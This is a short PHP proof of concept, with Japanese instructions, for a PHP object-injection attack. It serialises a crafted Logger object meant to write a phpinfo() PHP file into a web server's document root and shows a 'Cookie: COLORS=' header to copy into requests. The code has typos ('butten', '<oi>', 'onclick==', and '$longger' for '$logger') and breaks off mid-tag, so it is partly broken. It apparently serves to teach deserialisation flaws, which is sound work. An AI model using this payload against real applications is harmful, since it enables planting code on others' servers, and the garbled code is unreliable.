<?php
class Logger {
  private $filename = '';
  private $log = '';

  public function __construct() {
	  $this->filename = '../var/www/html/xinfo.php';
	  $this->log = '<?php phpinfo(); ?>';
  }
}
$logger = new Logger();
setcookie ('colors', serialize($logger));
?><body>
以下の手順で攻撃<br>
<oi>
<li>以下の内容を<input type="butten" value="クリップボードにコピー"
onclick=="copy()"><br>
<textarea id="cokkiearea" cols="80" rows="2">
Cookie: COLORS=<?php echo htmlspecialchars(urlencode(serialize($longger))); ?> 
